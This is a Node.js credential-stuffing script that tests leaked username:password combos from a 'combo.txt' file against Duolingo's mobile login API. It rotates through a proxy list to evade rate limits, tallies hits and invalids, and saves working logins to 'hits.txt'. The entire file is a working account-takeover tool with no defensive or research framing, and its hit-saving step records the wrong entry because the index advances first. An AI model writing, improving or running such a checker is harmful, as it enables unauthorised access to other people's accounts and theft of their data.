//Dependencies
const Request = require("request")
const Chalk = require("chalk")
const Fs = require("fs")

//Variables
const HTTP_Proxies = Fs.readFileSync("./proxies.txt", "utf8").split("\n")
const Accounts = Fs.readFileSync("./combo.txt", "utf8").split("\n")

var Checker_Data = {}
Checker_Data.hits = 0
Checker_Data.invalids = 0
Checker_Data.rpm = 0 //RPM stands for Request Per Minute 
Checker_Data.ltc = Accounts.length //LTC stands for Left To Check
Checker_Data.requests = 0
Checker_Data.hi = 0 //Both Hits & Invalids in one value for finish checking.
Checker_Data.whitelisted_accounts = [] //To avoid duplicate

//Functions
function Add_Hits(account){
    var Hits = Fs.readFileSync("./hits.txt", "utf8")

    if(Hits.length == 0){
        Fs.writeFileSync("./hits.txt", account, "utf8")
    }else{
        Fs.writeFileSync("./hits.txt", `${Hits}\n${account}`, "utf8")
    }
}

function Initiate_A_Checker(start_in_proxy_index){
    var Self_Account_Index = 0

    Main()
    async function Main(){
        var request_body = {"distinctId":"3e5b23ce-2bfa-43d7-8388-045f0e6a32aa", "fields": "acquisitionSurveyReason,adsConfig,betaStatus,bio,blockedUserIds,canUseModerationTools,courses,creationDate,currentCourse,email,emailAnnouncement,emailAssignment,emailAssignmentComplete,emailClassroomJoin,emailClassroomLeave,emailComment,emailEditSuggested,emailEventsDigest,emailFollow,emailPass,emailPromotion,emailWeeklyProgressReport,emailSchoolsAnnouncement,emailStreamPost,emailVerified,emailWeeklyReport,enableMicrophone,enableSoundEffects,enableSpeaker,experiments%7Bcourses_fr_ja_v1,courses_it_de_v1,hoots_web,hoots_web_100_crowns,hoots_web_rename,learning_det_scores_v1,learning_duolingo_score_v1,media_shorten_cant_speak_web,mercury_show_surveys_non_trial,mercury_web_custom_hdyhau_survey,midas_web_cta_purchase_start_my_14_day,midas_web_payment_requests_v2,midas_web_purchase_flow_checklist,midas_web_timeline_direct_purchase,midas_web_timeline_eligible_free_trial,midas_web_use_card_country,midas_web_use_postal_code,nurr_web_port_pre_lesson_tip_no_grammar,retention_web_banner_v3,retention_web_day_1_freeze_v1,schools_add_link_in_dweb_topbar,sigma_web_cancel_flow,sigma_web_cancel_flow_crossgrade,sigma_web_standardize_plus_colors_v2,spam_non_blocking_email_verification,stories_web_allow_extra_trial_story,stories_web_homepage_redesign_v2,stories_web_intro_callout_tier_1,tsl_web_daily_goal_copy,web_delight_mid_lesson_chars_v2,web_delight_prog_quiz_intro_banner_v2,web_enable_token_typing_all_latin,web_podcast_en_pt,web_token_typing_affordances,writing_bingo_web_internal%7D,facebookId,fromLanguage,globalAmbassadorStatus,googleId,hasPlus,id,inviteURL,joinedClassroomIds,lastStreak%7BisAvailableForRepair,length%7D,learningLanguage,lingots,location,monthlyXp,name,observedClassroomIds,persistentNotifications,picture,plusDiscounts,practiceReminderSettings,privacySettings,referralInfo,rewardBundles,roles,streak,streakData%7Blength%7D,timezone,timezoneOffset,totalXp,trackingProperties,unconsumedGiftIds,username,webNotificationIds,weeklyXp,xpGains,xpGoal,zhTw,_achievements", "identifier": Accounts[Self_Account_Index].split(':')[0],"password": Accounts[Self_Account_Index].split(':')[1].replace("\r", ""),"landingUrl":"https://www.duolingo.com/log-in?isLoggingIn=true","lastReferrer":""}
        request_body = JSON.stringify(request_body)

        if(Checker_Data.hi > Accounts.length){
            Checker_Data.hi = 9999999999999999999
            return
        }

        if(start_in_proxy_index > HTTP_Proxies.length){
            start_in_proxy_index = 0
            Main()
            return
        }

        if(Accounts[Self_Account_Index] == undefined){
            Self_Account_Index += 1
            Main()
            return
        }

        Request.post("https://ios-api-2.duolingo.com/2017-06-30/login", {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "UserAgent": "DuolingoMobile/6.14.1 (iPhone; iOS 12.0.1; Scale/2.00)"
            },
            proxy: `http://${HTTP_Proxies[start_in_proxy_index]}`,
            body: request_body
        }, function(err, res, body){
            Checker_Data.requests += 1

            if(err){
                start_in_proxy_index += 1
                Main()
                return
            }

            body = JSON.stringify(body)

            if(Checker_Data.whitelisted_accounts.indexOf(Accounts[Self_Account_Index]) != -1){
                Self_Account_Index += 1
                Main()
                return
            }

            if(res.body == ""){
                start_in_proxy_index += 1
                Main()
                return
            }

            Checker_Data.hi += 1
            if(Checker_Data.ltc > 0){
                Checker_Data.ltc -= 1
            }

            if(body == '"{}"'){
                Checker_Data.invalids += 1
                Self_Account_Index += 1
                Main()
                return
            }

            if(body.indexOf("Unavailable") != -1){
                start_in_proxy_index += 1
                Main()
                return
            }

            if(body.indexOf("learningLanguage") != -1){
                Checker_Data.whitelisted_accounts.push(Accounts[Self_Account_Index])
                Checker_Data.hits += 1
                Self_Account_Index += 1
                Add_Hits(Accounts[Self_Account_Index])
                Main()
                return
            }else{
                Checker_Data.invalids += 1
                Self_Account_Index += 1
                Main()
                return
            }
        })
    }
}

//Main
setInterval(function(){
    console.clear()
    console.log(Chalk.yellowBright(`======================================================
    ██████  ██    ██ ██      ██ ███    ██  ██████  
    ██   ██ ██    ██ ██      ██ ████   ██ ██       
    ██   ██ ██    ██ ██      ██ ██ ██  ██ ██   ███ 
    ██   ██ ██    ██ ██      ██ ██  ██ ██ ██    ██ 
    ██████   ██████  ███████ ██ ██   ████  ██████  
======================================================`))

    console.log(Chalk.greenBright(`Hits: ${Checker_Data.hits}`))
    console.log(Chalk.redBright(`Invalids: ${Checker_Data.invalids}`))
    console.log(Chalk.magentaBright(`LTC: ${Checker_Data.ltc}`))
    console.log(Chalk.blueBright(`RPM: ${Checker_Data.rpm}`))

    if(Checker_Data.hi == 9999999999999999999){
        console.log(Chalk.green("Done checking."))
        process.exit()
    }
}, 1000)

setInterval(function(){
    Checker_Data.rpm = Checker_Data.requests
    Checker_Data.requests = 0
}, 60000)

for( i = 0; i <= HTTP_Proxies.length; i++ ){
    Initiate_A_Checker(i)
}

process.on("uncaughtException", function(){
    return
})
